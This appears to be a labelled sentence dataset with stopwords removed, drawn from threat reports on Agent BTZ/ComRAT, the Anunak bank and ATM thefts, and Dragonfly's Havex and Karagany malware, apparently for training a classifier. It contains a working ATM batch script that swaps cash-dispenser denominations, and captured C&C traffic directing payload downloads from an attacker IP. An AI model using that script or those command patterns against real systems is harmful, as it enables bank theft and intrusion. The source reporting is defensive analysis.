+We assume actor behind campaigns uses several different malware strains order compromise targeted infrastructure Uroburos rootkit ; Agent BTZ / ComRAT remote administration tools Linux malware maybe even	0
+We decided even closer look Agent BTZ ComRAT therefore analyzed evolution RAT covering seven years development	0
+Here table minimal information 46 different samples	0
+Thanks versioning deduce compilation dates saw currently see actually seem legit – except last known version author modified compilation date order make analysis complex	0
+We see malware really active 2007 2008	0
+New versions declined frequency 2009 one new sample identified 2010	0
+We encounter new sample 2011 malware appeared back 2012 new major version	0
+To describe evolution development decided compare ten major versions	0
+The following chapter present main differences versions mentioned	0
+Here resemblance ratio version comparing direct neighbor versions created using BinDiff	0
+The biggest code update occurred version 2.14.1 version 3.00	0
+The gap matches absence samples two years fundamental modification call death Agent BTZ birth ComRAT	0
+Differences version Ch 1.0 ( 2007 - 06 ) Ch 1.5 ( 2008 - 03 ) The analyzed samples	0
+We identify strong modification two samples	0
+However notice following	0
+Differences version Ch 1.5 ( 2008 - 03 ) Ch 2.03 ( 2008 - 05 ) The analyzed samples	0
+In version 2.03 Agent BTZ authors changed following	0
+They added obfuscation order hide sensitive strings ; The communication protocol modified order include flag " CHCMD " assume " CH " meaning " Ch " version number " CMD " abbreviation command ; From malware supports " runas " order execute commands administrator	1
+This command implemented Microsoft Windows Vista 2007	0
+We assume author implemented feature several targets switched version Windows 2008	0
+According article version 1.5 used US Pentagon	0
+We assume string obfuscation performed order bypass security measures capable detecting intrusion	0
+Differences version Ch 2.03 ( 2008 - 05 ) Ch 2.11 ( 2009 - 09 ) The analyzed samples	0
+The codes two versions extremely similar notice small changes	0
+Differences version Ch 2.11 ( 2009 - 09 ) Ch 2.14.1 ( 2010 - 02 ) The analyzed samples	0
+These codes really similar	0
+We notice two changes	0
+The four exported libraries show malware started support OLE Component Object Model ( COM )	0
+This version first version able registered COM object	0
+Three four functions empty	0
+The fourth one executes malware	0
+Differences version 2.14.1 ( 2010 - 02 ) Ch 3.00 ( 2012 - 01 ) The analyzed samples	0
+These codes really differ even parts version 2.14.1 retained	0
+Moreover developers changed compiler ; switched Visual Studio 6.0 Visual Studio 9.0/10.0 strong indicator huge differences Version 3.00 G DATA SecurityLabs experts call ComRAT	0
+We say version 2.14.1 last version Agent BTZ	0
+Here main differences Agent BTZ ComRAT	0
+On several 3.00 samples author forgot remove compilation path examples	0
+Thanks compilation paths assume original name RAT " Chinch " leads us assumption " CH " characters version name flag " CHCMD " stands " Chinch "	0
+In English chinch word small North American bug Blissus leucopterus	0
+This word derived Spanish word chinche meaning pest	0
+Differences version 3.00 ( 2012 - 01 ) Ch 3.10 ( 2012 - 12 ) The analyzed samples	0
+The codes similar authors added several features	0
+The last new feature really interesting compromised targets block specific command control server malware continue work thanks two alternative command control servers	0
+Differences version 3.10 ( 2012 - 12 ) Ch 3.20 ( 2013 - 06 ) The analyzed samples	0
+The major new feature version new exports function called InstallW ( )	0
+This exported function used dropper add persistence registry drop second file ( explained previous article )	1
+Version 3.20 uses following CLSID order hijack COM object B196B286-BAB4- 101A - B69C-00AA00341D07	0
+This object IConnectionPoint interface	0
+The CLSID used version	0
+We assume performed COM object hijacking generates trouble infected system 's author changed related things next version	0
+Furthermore CLSID stored plain text within sample	0
+Differences version Ch 3.20 ( 2013 - 06 ) Ch 3.25 ( 2014 - 02 ) The analyzed samples	0
+In 3.25 version author switched CLSID 42aedc87 - 2188 - 41fd - b9a3 - 0c966feabec1 described article	0
+Furthermore strings sample obfuscated	0
+The main new feature obfuscation – almost strings obfuscated XML pattern written plain text anymore	0
+Differences version Ch 3.25 ( 2014 - 02 ) Ch 3.26 ( 2013 - 01 ; date modified ) The analyzed samples	0
+The version 3.26 latest known version	0
+In version	0
+This analysis shows us seven years evolution Remote Administration Tool used group targeted extremely sensitive entities US Pentagon 2008 Belgium Ministry Foreign Affairs 2014 well Finnish Ministry Foreign Affairs	0
+Except version 3.00 modifications made rather marginal	0
+We see authors adapted features Windows versions patched bugs added obfuscation etc … The biggest update performed version 3.00 two years silence	0
+Visibly RAT used alongside Uroburos rootkit	0
+Nevertheless entirely clear attackers choose use RAT rootkit whether used parallel	0
+Taking everything consideration G DATA SecurityLabs experts sure group behind Uroburos / Agent BTZ / ComRAT / Linux tool/ … remain active player malware APT field	0
+The newest revelations made connections drawn let us believe even come	0
+Hereby Group - IB Fox - IT inform This report describes details type op- erations carried organized criminal group focuses financial industry banks payment providers retail industry news media PR companies	0
+The group origin common financial fraud including theft con- sumer corporate bank accounts Europe Russia using standard banking malware mainly Carberp	0
+After arrests Carberp group members Russia members work however experience gained many years crime allowed enter new niche	0
+One members quickly realized steal $ 2000 thousand times earn $ 2 million also steal one time immediately get much less effort	0
+The anti - fraud measures employed banks pushed criminals search new ways make money less bar- riers compromising modifying taking data banks payment providers retail media/ PR companies methods	0
+From 2013 organized criminal group intensi- fied activity focused banks electronic pay- ment systems Russia post - Soviet space	0
+The key fraud occurs within corporate network using internal payment gateways in- ternal banking systems	0
+Thus money stolen banks payment systems customers	0
+While main lucra- tive activity gang also ventured areas including compromise media groups organizations industrial espionage likely trading advantage stock market	0
+In cases group got access government agency networks aim espionage related	0
+The organized criminal group backbone citizens Russian Ukrainian origin group also sources number mainstream specialized services individuals groups originating Russia Ukraine Belarus	0
+The average sum theft Russian terri- tory post - Soviet space $ 2 million per incident	0
+Since 2013 successfully gained access networks 50 Russian banks 5 payment systems 2 institutions deprived banking license	0
+To date total amount theft 1 billion rubles ( 25 million dollars ) stolen second half 2014	0
+The average time moment penetration financial institutions internal network till successful theft 42 days	0
+As result access internal bank networks attackers also managed gain access ATM management infrastructure infect sys- tems malicious software allows theft banks ATM systems attackers command	0
+Since 2014 organized criminal group mem- bers began actively taking interest US Eu- ropean based retail organizations	0
+While already familiar POS malware compromis- ing POS terminals widespread media attention around Target breach related breaches reason move	0
+While scale breaches industry still relatively low least 3 successful card breaches dozen retailers compromised activity quickly becom- ing lucrative endeavor group	0
+To penetrate internal networks organized criminal group employs targeted emailing ( spear phishing ) infections sources botnets	0
+This main reason group keeping touch owners large botnets	0
+Since August 2014 group began create large botnet using mass emailing using typical exploit driveby infections	0
+This last move likely reduce need external contacts	0
+The first successful bank robbery committed group January 2013	0
+In first cases attackers used program RDPdoor remote access bank network program " MBR Eraser " remove traces crack Windows computers servers	1
+Both programs used members Carberp criminal group guidance person named Germes	0
+To reduce risk losing access internal bank network attackers addition malicious programs also used remote access legitimate pro- grams Ammy Admin Team Viewer	0
+Lat- er attackers completely abandoned usage RDPdoor Team Viewer	0
+In addition banking payment systems hackers got access e - mail servers control internal communications	1
+This approach allowed find anomalous activity bank network identified technique used identify activity measures bank employees took solve problem	0
+Email control successfully installed regardless used email system MS Exchange Lotus	0
+This approach allowed take countermeasures created bank payment system employees feeling problem solved	0
+The main steps attack progression following ones To carry target attacks 2014 hackers finalized development core malware Anunak used along following tools	0
+According laboratory classification main malware " Anunak "	0
+This trojan used target attacks mainly banks payment systems	0
+Target usage program allows remain poorly explored providing good surviv- ability inside corporate networks	0
+The source code bank trojan program Carberp used places malware	0
+" Anunak " following feature set	0
+There ability download arbitrary exe- cutable files management server run	1
+One files program " AmmyAd- min " may run arguments " -service " " -nogui " force start service without user interface	0
+" AmmyAdmin " allows connect another computer software server " rl.ammyy.com " using IP address unique identifier	0
+As result attacker gets remote access user computer running program " AmmyAdmin " bypassing firewalls	1
+The window screenshot shown figure	0
+When attackers gain access servers running operating systems Linux family use SSH backdoor transmits malicious server login / password data used access servers provides attackers remote access servers	1
+To provide access server interest at- tackers may appropriately modify rules firewalls Microsoft TMG CISCO etc	1
+When attackers yet major malware would secretly install program " AmmyAd- min " report attackers remote access password used malicious program known " Barus "	0
+This malware used rarely last time met 2013	0
+This malicious program developed Russian - speaking authors	0
+In control panel notice field " Ammy ID " usage allowed attackers connect remotely	0
+At beginning activity 2013 due lack target Trojan attackers began distribute Andromeda Pony	0
+They distributed malware using Driveby bunch Neutrino Exploit Kit exploits shown figure	0
+It interesting autumn 2013 used site http://php.net/ traffic source Magnitude EK	0
+They redirected traffic resource since July 2013 fact discov- ered much later	0
+The name one streams distribute malware " LOL BANK FUCKIUNG " corresponded attacker activities	0
+Parallel technique also use another infection method one principal methods	0
+The main method distribution send- ing emails malicious attachments behalf Central Bank Russian Federation poten- tial client real counterparty ( first attack- ers cracked counterparty account used emailing cracked contact list )	0
+Another used method install special malware carry targeted attacks via another malware might appear local network accident	0
+To find malicious programs criminal group keeps touch several owners large botnets massively distributes mal- ware	0
+The attackers buy botnet owners information IP - addresses computers botnet owners installed malware check whether IP - address belongs financial government institutions	0
+If mal- ware subnet interest attackers pay large botnet owner installation target malware	0
+Such partner relations established owners botnets Zeus Shiz Ranbyus	0
+All trojans bank Trojans usage ex- plained previously established relationships	0
+In late 2013 hacker alias Dinhold be- gan build botnet using modified Carberp uploaded source code public access	0
+The attackers trying create similar relations hacker 2014 arrested developed botnet required level	0
+To check whether IP - address belongs desired network following script used	0
+The dangerous emailings sent behalf partners financial government institutions communicates permanently email	0
+An example emailing occurred Septem- ber 25 2014 14:11 e - mail address " Elina Shchekina e.shekina@rbkmoney.com " subject " Updated agree- ment version "	0
+The attachment " agreement.doc " exploits vul- nerability CVE-2012 - 2539 CVE-2012 - 0158	0
+The emailing conducted 70 addresses various compa- nies ( multiple recipient addresses may within one company )	0
+The letter malicious attachment ( md5 AA36BA9F- 4DE5892F1DD427B7B2100B06 ) archive password potential client sent bank manager pre- liminary telephone conversation	0
+The call origin Saint Petersburg	0
+Contents text file named " реквизиты.doc " ( partner de- tais.doc ) " Company Our Century " Ltd.	0
+109387 Russia Moscow Anosov str 24 office 409 Tel	0
+( 495 ) 124 - 99 - 77 Fax ( 495)124 - 99 - 77 Mobile ( 962 ) 7135296 E - mail x60x@nxt	0
+ru INN 7329001307 KPP 732901001 Account 40702810613310001709 Branch VTB 24 ( JSC ) Moscow Correspondent account 30101810700000000955 BIC 043602955 A letter behalf Central Bank Russia malicious attachment ( md5 8FA296EFAF87FF4D- 9179283D42372C52 ) exploited vulnerability CVE-2012- 2539 order execute arbi- trary code	0
+There also exam- ples emails malicious attachments emailing file " 001	0
+photo.exe "	0
+A detailed list attachments see Table " Email attachments "	0
+Availability access bank internal networks opens great opportunities hackers	0
+One opportunities access ATMs spe- cial network segments isolated	0
+It confirmed criminal group gained access 52 ATMs	0
+The amount damage exceeds 50 million rubles	0
+As result access ATMs depending ATM model hackers used different patterns	0
+Having access attackers downloaded mali- cious scripts changed denominations issued banknotes ATM operating system registry	1
+As result query get 10 notes denomination 100 roubles attackers received 10 banknotes denomination 5,000 roubles	0
+The used malicious script program developed platform Wincor	0
+The malicious script contains following commands	0
+Contents file " 1.bat " REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_1 /t REG_SZ /d " 5000 " /f REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_2 /t REG_SZ /d " 1000 " /f REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_3 /t REG_SZ /d " 500 " /f REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_4 /t REG_SZ /d " 100 " /f REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_1 /t REG_SZ /d " 100 " /f REG ADD " HKEY_LOCAL_MACHINE\SOFTWARE\ Wincor Nixdorf\ProTopas\CurrentVersion\LYNX- PAR\CASH_DISPENSER " /v VALUE_4 /t REG_SZ /d " 5000 " /f shutdown -r -t 0 –f Execution file changed registry keys registry branch " " HKEY_LOCAL_MACHINE\ SOFTWARE\Wincor Nixdorf\ProTopas\Current- Version\LYNXPAR\CASH_DISPENSER " " responsible cassette denominations ATM	1
+As result file execution registry key charge cassette number 1 ( VALUE_1 ) takes value " 100 " registry key respon- sible cassette number 4 ( VALUE_4 ) set " 5000 "	0
+Then command restart computer issued	0
+The registry key reference values If ATM actual load corresponds refer- ence one registry keys changed banknotes cassette No.1 issued denomination " 5000 " instead " 100 "	0
+In addition attackers used modified debug program allows command issue mon- ey dispenser	0
+The original debug program issues money dispenser open ATM housing vault door fixed	0
+In order ensure money issuance closed ATM attackers modify original program " KDIAG32 " ( original file size 1,128,960 MD5 4CC1A6E049942EB- DA395244C74179EFF )	0
+A comparison original version pro- gram modified version showed difference ignoring error " " Door opened missing " "	0
+The figure shows error message never displayed user file investigation	0
+All traces found investigation one incident showed criminal group worked	0
+Ammy Admin used remote access SSHD backdoor installed Unix servers In addi- tion loaded hacked server cases trojan Anunak usage	0
+However case Androm- eda used main trojan instead Anunak	0
+The man- agement servers located Kazakhstan Germany Ukraine	0
+Check manage- ment servers showed hosting Bulletproof addition servers provides service traffic proxying infrastructure well TOR VPN usage pattern significantly differs Anunak host- ing patern	0
+Check money cashout showed cashout criminal group worked Anunak fact confirmed cooperation	0
+Obtained Andromeda trojan copies distributed August 2014 e - mail	0
+The value 754037e7be8f61cbb1b85ab46c7da77d MD5 hash string " go fuck " used RC4 encryption key	0
+As result distri- bution August late October Andromeda botnet rose 260,000 bots	0
+Successful infection one subnet resulted sending letters bank employees	0
+Example forwarding infected bank network employees another bank shown	0
+As result radial mailing many oil gas companies banks government agencies in- fected	0
+In Russia least 15 banks two payment systems infected way	0
+Letters similar attachments dis- tributed following subjects " My new photo " " Alert Transactions Report users 2014- 09 - 28 2014 - 09 - 28 " Previously noted fact process stolen money withdrawal ( cashout ) differed firstly theft method secondly victim type ( bank payment system ) thirdly total stolen sum	0
+The victims type divided rather counterparty types limitations imposed operation counterparties	0
+For example payments required go certain pool mediators	0
+In addition " improper " pool counterparties could cause suspicion unneces- sary testing ( manual processing payment orders )	0
+Bank ( amounts 100 million roubles )	0
+While attacks Russia banks payment systems occurred past two years attacks retail industry something started second quarter 2014	0
+With least three confirmed breaches card track data obtainedand total least 16 breaches retail organizations also becoming serious threat	0
+Apart retail organizations also known number media PR companies breached 2014	0
+While entirely cer- tain type breaches suggest attackers looking inside information type indus- trial espionage allowing gain advantage stock market	0
+As nothing specifically missing resulting fraud hard match anything incidents typically never linked	0
+From retail perspective first infections 2014 sourced botnet employs widely deployed crypto - currency mining malware based Gozi / ISFB ( banking ) malware family	0
+Based insights believe first half 2014 half million systems compromised malware whole world however Russia number post - Soviet states clean infections	0
+To find interesting infections within large set compromised systems malware extracts relevant information systems including Microsoft Windows organization registration information network/ Windows domain information	0
+The Gozi / ISFB based malware used drop additional components interesting systems included Metasploit / Meterpreter payloads Anunak variants	1
+This one main methods group using Anunak obtain in- teresting infections middle 2014 sourcing infections botnet operators More recent- ly infection methods including spear phishing using English language possibly also usage teams Andromeda also SQL injection breach organization directly outside employed team	0
+The first known attacks Anunak targeted specific brand POS systems revolved around Epicor / NSB brand	0
+To Anunak specific code target POS devices equipped software contrary common memory scanning track data scrapers logs wealth information payments done cards	0
+The first case seen active July 2014 might earlier well	0
+More recent breaches used new custom developed POS malware simple reliable track data memory scraper	0
+The initial version early fall 2014 used simple blacklist scraped every process dumped track data plain text	0
+More recent versions scanned configuration specified processes used RC4 encrypt extracted track data records disk	0
+While retail industry one main targets due payment processing capabilities compromises might occur indirectly example obtain databases information informa- tion value organized criminal group	0
+One possibilities obtaining lists corporate email addresses higher chance interest- ing infections	0
+At moment evidence successful compromise theft banks payment systems outside Russia several infections east Europe ( specifically Ukraine Latvia ) active 2014	0
+These specific infections related infrastructure organizations based Russia significant interests Russia thus likely related breaches organization Russia	0
+The majority infections Europe dedicated servers used exit node VPN services systems infected likely Eastern Euro- pean Russian origin possibly test infections attackers	0
+We evidence compro- mises banks Western Europe United States noted attackers methods could utilized banks outside Russia well	0
+The group uses Metasploit one main hacking tools either stand alone part framework	0
+The activity includes port scanning system reconnaissance escalating privileges systems using example recent CVE-2014- 4113 vulnerability gathering credentials hop- ping systems networks	0
+Metasploit used full potential scanning exploiting privilege escalation post exploitation persistence achieved standard toolset	0
+On interesting critical systems typical hack- ing tools might found establish tunnels network either tools part Metasploit framework Meterpreter also tools achieve persistence systems	0
+The connect back methods seen typically SSL port 443 also DNS based methods observed	0
+The attackers use BITS download files also make use Windows built - PowerShell download tools execute commands	0
+Finally critical systems freshly crypted non - detected versions Anunak deployed typically used limited deployments thus spread limited detection Anti - Virus rare	0
+Various stealth methods including aforemen- tioned backconnect SSL DNS tunneling compromise persistence data exfiltration used	0
+The Anunak malware multiple ways connecting backends includes PHP based backend reachable HTTP HTTPS Windows server based component using propri- etary protocol	0
+The use VNC scanning password brute forcing adding additional administrator accounts use RDP Wrapper allow concurrent RDP sessions methods gain access achieve persistent access compromised systems employed group	0
+Additionally various ways creating incidental regular screen captures desktop persons interest within com- promised organizations methods employed attackers	0
+This also includes video captures made Anunak malware allowing attackers observe behavior users certain applications	0
+Group - IB one leading international companies specializing preventing investigat- ing high - tech cyber crimes fraud	0
+The company offers range services preventing financial reputational damages consulting auditing information security systems computer forensics	0
+The company also develops number innovative software products used monitor detect prevent emerging cyber threats	0
+The Group - IB team made experts unique skills solid practical experience	0
+They internationally certified CISSP CISA CISM CEH CWSP GCFA also information security state certificates	0
+In 2013 computer secu- rity incident response team CERT - GIB operated Group - IB became member FIRST - Forum Incident Response Security Teams	0
+In 2013 company became member international cyber security alliance IMPACT ( In- ternational Multilateral Partnership Against Cyber Threats )	0
+www.group-ib.com Fox - IT creates innovative cyber security solutions secure society	0
+We dedicated clients values integrity	0
+Fox - IT delivers solutions attacks	0
+InTELL real - time cyber intelligence product Fox - IT	0
+It provides layered intelligence approach actionable data feeds operational risk decision systems	0
+Real time threat information allows tactical decisions mitigation	0
+InTELL provides full real - time insight global threat landscape	0
+We base intelligence around actor attribu- tion	0
+This angle drives unique visibility online threats - InTELL sees threats enter botnet	0
+Information delivered col- laboration portal alerting automated feeds powered industry standard transports	0
+www.fox-it.com	0
+A cyberespionage campaign range targets mainly energy sector gave attackers ability mount sabotage operations victims	0
+The attackers known Symantec Dragonfly managed compromise number strategically important organizations spying purposes used sabotage capabilities open could caused damage disruption energy supply affected countries	0
+The Dragonfly group also known vendors Energetic Bear capable group evolving time targeting primarily energy sector related industries	0
+They operation since least 2011 may active even longer	0
+Dragonfly initially targeted defense aviation companies US Canada shifting focus US European energy firms early 2013	0
+More recent targets included companies related industrial control systems	0
+Dragonfly used spam email campaigns watering hole attacks infect targeted organizations	0
+The group used two main malware tools Trojan Karagany Backdoor Oldrea	0
+The latter appears custom piece malware either written attackers	0
+Symantec observed spear phishing attempts form emails PDF attachments February 2013 June 2013	0
+The email topics related office administration issues dealing account problems delivery	0
+Identified targets campaign mainly US UK organizations within energy sector	0
+In May 2013 attackers began use Lightsout exploit kit attack vector redirecting targets various websites	0
+The use Lightsout exploit kit continued date albeit intermittently	0
+The exploit kit upgraded time obfuscation techniques	0
+The updated version Lightsout became known Hello exploit kit	0
+A newer approach used attackers involves compromising update site several industrial control system ( ICS ) software producers	1
+They bundle Backdoor Oldrea legitimate update affected software	1
+To date three ICS software producers known compromised	0
+The Dragonfly attackers used hacked websites host command - - control ( C&C ) software	1
+Compromised websites appear consistently use form content management system	0
+The current targets Dragonfly group based compromised websites hijacked software updates energy sector industrial control systems particularly based Europe	0
+While majority victims located US appear mostly collateral damage	0
+That many computers likely infected either watering hole attacks update hijacks interest attacker	0
+By examining victims active infections – additional malicious activity detected – possible gather accurate picture ' true ' victims	0
+The active infections Figure 2 Spain followed order US France Italy Germany	0
+Dragonfly uses two main pieces malware attacks	0
+Both Remote Access Tool ( RAT ) type malware provide attackers access control compromised computers	1
+Dragonfly 's favored malware tool Backdoor Oldrea also known Havex Energetic Bear RAT	0
+Oldrea acts back door attackers victim 's computer allowing extract data install malware	1
+Oldrea appears custom malware either written group created	0
+This provides indication capabilities resources behind Dragonfly group	0
+The second main tool used Dragonfly Trojan Karagany	0
+Unlike Oldrea Karagany available underground market	0
+The source code version 1 Karagany leaked 2010	0
+Symantec believes Dragonfly may taken source code modified use	0
+Symantec found majority computers compromised attackers infected Oldrea	0
+Karagany used around 5 percent infections	0
+The two pieces malware similar functionality prompts attackers choose one tool another remains unknown	0
+The Dragonfly group used least three infection tactics targets energy sector	0
+The earliest method email spear phishing campaign saw selected executives senior employees target companies receive emails containing malicious PDF attachment	1
+Infected emails one two subject lines " The account " " Settlement delivery problem "	0
+All emails single Gmail address	0
+Figure 3 displays number different recipients per day	0
+The spam campaign began February 2013 continued June 2013	0
+Symantec identified seven different organizations targeted campaign	0
+At least one organization attacked intermittently period 84 days	0
+In June 2013 attackers shifted focus watering hole attacks	0
+They compromised number energy- related websites injected iframe	0
+This iframe redirected visitors another compromised legitimate website hosting Lightsout exploit kit	0
+This turn exploited either Java Internet Explorer order drop Oldrea Karagany victim 's computer	1
+The fact attackers compromised multiple legitimate websites stage operation evidence group strong technical capabilities	0
+In September 2013 Dragonfly began using new version exploit kit known Hello exploit kit	0
+The landing page kit contains JavaScript fingerprints system identifying installed browser plugins	0
+The victim redirected URL turn determines best exploit use based information collected	0
+Figure 4 shows compromised websites categorized respective industries	0
+Fifty percent identified targets energy industry related thirty percent energy control systems shown Figure 4	0
+A clear shift attackers targeting seen March 2014 energy control systems become primary target	0
+The ambitious attack vector used Dragonfly compromise number legitimate software packages	0
+Three different ICS equipment providers targeted malware inserted software bundles made available download websites	0
+Analysis compilation timestamps malware used attackers indicate group mostly worked Monday Friday activity mainly concentrated nine - hour period corresponded 9 6 pm working day UTC + 4 time zone	0
+The Dragonfly group technically adept able think strategically	0
+Given size targets group found " soft underbelly " compromising suppliers invariably smaller less protected companies	0
+Identification group based use two malware families exploit kit	0
+The malware families utilized Backdoor Oldrea Trojan Karagany	0
+The exploit kit known Lightsout and/or Hello	0
+Hello updated iteration Lightsout Dragonfly group began use September 2013	0
+Use Backdoor Oldrea appears limited Dragonfly group	0
+In addition specific instances Trojan	0
+Karagany used group	0
+Karagany Russian RAT sold underground forums	0
+Instances malware related Dragonfly group identified based delivered Lightsout exploit kit also particular packer group used	0
+Symantec detects Trojan Karagany packer used group Trojan Karagany!gen1	0
+The Lightsout exploit kit simple exploit kit consistently used deliver primarily Backdoor Oldrea several instances Trojan Karagany	0
+A number sites use content management systems exploited iframe used order redirect visitors sites hosting Lightsout exploit kit	0
+An example injected iframe seen figure 7	0
+The exploit kit uses browser ( e.g.	0
+Internet Explorer Firefox ) Java exploits order deliver either Backdoor Oldrea Trojan Karagany	0
+An example structure Lightsout exploit kit seen Table 1	0
+Note file names exploits used may vary	0
+In September 2013 Dragonfly group began using new version Lightsout also known Hello exploit kit	0
+The JavaScript included landing page redirects browser URL depends fonts installed system browser add - ons OS version user agent	0
+At point determines best exploit use based information provided generates appropriate URL redirect user appropriate exploit / payload	0
+The following shows example request [ http://]compromised.example / wp - includes / pomo/ dtsrc.php?a=[EK _ DETERMINED _ PARAMETER ] [ EK_DETERMINED_PARAMETER ] may anything listed Table 2	0
+The parameters dwe dwd relate payload requested download example The values [ EK_DETERMINED_PARAMETER ] variable may relate two different file types represented Backdoor Oldrea Trojan	0
+Karagany!gen1 payloads	0
+Oldrea payloads DLL files ( URLs end " " DLL ? ) Karagany!gen1 payloads portable executables ( URLs end " e " EXE ? )	0
+At core Backdoor Oldrea persistent component interacts C&C servers download execute payloads	1
+The components downloaded reaching C&C server performing GET request returns HTML page containing base64 encoded string two comments marked ' havex ' string	1
+In specific example ' 038 ' file name indicates major version number	0
+Post infection Backdoor Oldrea attempt collect system information OS user name computer name country language nation Internet adapter configuration information available drives default browser running processes desktop file list My Documents Internet history program files root available drives	1
+It also collects data Outlook ( address book ) ICS related software configuration files	0
+This data collected written temporary file encrypted form POST'ed remote C&C server	1
+The following examples POST request POST response	0
+POST request example POST /wp08/wp - includes / dtcla.php?id=285745296322896178920098FD80 - 20&v1=038&v2=17 0393861&q=5265882854508EFCF958F979E4 HTTP/1.1 User - Agent Mozilla/5.0 ( Windows ; U ; Windows NT 6.1 ; en - US ) AppleWebKit/525.19 ( KHTML like Gecko ) Chrome/1.0.154.36 Safari/525.19 Host toons.freesexycomics.com Content - Length 0 Cache - Control - cache POST response example HTTP/1.1 200 OK Date We 22 Jan 2014 13:40:48 GMT Content - Type text / html Transfer - Encoding chunked Connection keep - alive Server Apache/1.3.37 ( Unix ) Cache - Control - cache 9f65 html><head><mega http - equiv='CACHE - CONTROL ' content='NO - CACHE'></ head><body No data!<!--havexQlpoOTFBWSZTWWYvDI0BOsD//////////////////////////////////// /////////4oB+93VVXu69DuN7XYzds9yt49Ques [ ... TRUNCATED FOR READABILITY ] + yUW3zfTxWAOstsCwCckdW5 AH5Q6vbbCu7GputPt5CSfgPCAKXcAOOICMsqliACGYEhAQT3v9eD M92D/8XckU4UJBmLwyNA==havex--></body></head Various samples process C&C responses differently	0
+In one example sample searches data enclosed tag ' havex '	0
+Once data found decoded using standard base64 + bzip2 also xor layer bytes string 1312312	0
+The decoded data contains small header followed executable MZ - file	0
+Another sample found use standard base64 + reverse xor + RSA-2048 decrypting received data	0
+The decrypted data consists 6 byte command concatenated MZ file	0
+The MZ file compressed lzma algorithm	0
+RSA keys decryption together initial configuration information stored registry base64 form	0
+This section includes information identified payloads downloaded Backdoor Oldrea	0
+The following brief description functionality identified component	0
+Trojan Karagany back door used primarily recon	0
+It designed download install additional files exfiltrate data	1
+Samples sometimes use common binary packers UPX Aspack top custom Delphi binary packer / protector payload	0
+Where present samples Delphi packer configured use ' neosphere ' key decrypt payload	0
+The following brief overview functionality Trojan Karagany	0
+Trojan Karagany creates folder user APPDATA directory chooses directory name following list	0
+It copies created directory hidden system attributes using file name chosen following list	0
+Trojan Karagany copies hidden system attributes first executed err.log[DIGITS ]	1
+It copies legitimate chkdsk utility installation folder using payload file name space file extension	0
+This may fool ordinary users thinking folder contains legitimate application example PnPutil .exe	0
+Trojan Karagany!gen1 may create following additional files installation folder	0
+It creates C:\ProgramData\Mail\MailAg\gl directory temporary directory used uploading files	0
+Trojan Karagany creates link Startup folder autostart system restarts	0
+Trojan Karagany first checks live Internet connection visiting Microsoft Adobe websites	1
+It reach C&C server check successful	1
+Example HTTP Requests Internet connection test Microsoft GET /en - us / default.aspx HTTP/1.1 Accept - Encoding gzip deflate Content - Type application / x - www - form - urlencoded Host microsoft.com Cookie MC1=V=3&GUID=<32 character guid Connection Keep - Alive Cache - control - cache Internet connection test Adobe using identifiant parameter POST /geo / productid.php HTTP/1.1 Content - Type application / x - www - form - urlencoded Host adobe.com ...	0
+identifiant=51032 _ 175129256364 Example POST request C&C server check - POST /check _ value.php HTTP/1.1 User - Agent Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 6.1 ; .NET CLR 2.0.50727 ) Host 93.188.161.235 ...	0
+identifiant=51032 _ 1799883375637&version = i2pver HTTP response example HTTP/1.1 200 OK Date Tue 28 Jan 2014 05:59:58 GMT Vary Accept - Encoding Content - Length 324 Content - Type text / html X - Powered - By PHP/5.3.10 - 1ubuntu3.9 Via 1.1 host.alexsieff.com work:3|downexec [ http://]93.188.161.235/check2/muees27jxt / shot.jpg ; work:5|downexec [ http://]93.188.161.235/check2/muees27jxt / tl.jpg ; work:7|downexec [ http://]93.188.161.235/check2/muees27jxt / fl.jpg ; work:103|downexec [ http://]93.188.161.235/check2/muees27jxt / pdump.jpg ; work:118|downexec [ http://]93.188.161.235/check2/muees27jxt / fl.jpg ; The POST data contains operating system version derived number	0
+User - Agent tokens used C&C requests hard - coded	0
+The following two examples observed	0
+Regular expression URL HTTP request - line searches	0
+Regular expression file system searches	0
+Karagany Yara rule Symantec Security Response ﻿﻿ Symantec protects world 's information global leader security backup availability solutions	0
+Our innovative products services protect people information environment - smallest mobile device enterprise data center cloud - based systems	0
+Our industry - leading expertise protecting data identities interactions gives customers confidence connected world	0
+More information available www.symantec.com connecting Symantec go.symantec.com/socialmedia	0
+Headquartered Mountain View Calif. Symantec operations 40 countries	0
+More information available www.symantec.com	0
+For specific country offices contact numbers please visit website	0
+Symantec World Headquarters 350 Ellis St.	0
+Mountain View CA 94043 USA + 1 ( 650 ) 527 - 8000 1 ( 800 ) 721 - 3934 www.symantec.com Copyright 2014 Symantec Corporation	0
+All rights reserved	0
+Symantec Symantec Logo Checkmark Logo trademarks registered trademarks Symantec Corporation affiliates U.S.	0
+countries	0
+Other names may trademarks respective owners	0
+Any technical information made available Symantec Corporation copyrighted work Symantec Corporation owned Symantec Corporation	0
+NO WARRANTY	0
+The technical information delivered Symantec Corporation makes warranty accuracy use	0
+Any use technical documentation information contained herein risk user	0
+Documentation may include technical inaccuracies typographical errors	0
+Symantec reserves right make changes without prior notice	0
+From late 2013 onwards several banks financial institutions attacked unknown group cybercriminals	0
+In attacks similar modus operandi used	0
+According victims law enforcement agencies ( LEAs ) involved investigation could result cumulative losses 1 billion USD	0
+The attacks still active	0
+This report provides technical analysis attacks	0
+The motivation attackers making use techniques commonly seen Advanced Persistent Threats ( APTs ) appears financial gain opposed espionage	0
+An analysis campaign revealed initial infections achieved using spear phishing emails appeared legitimate banking communications Microsoft Word 97 – 2003 ( .doc ) Control Panel Applet ( .CPL ) files attached	0
+We believe attackers also redirected exploit kits website traffic related financial activity	0
+The email attachments exploit vulnerabilities Microsoft Office 2003 2007 2010 ( CVE-2012 - 0158 CVE-2013 - 3906 ) Microsoft Word ( CVE-2014- 1761 )	0
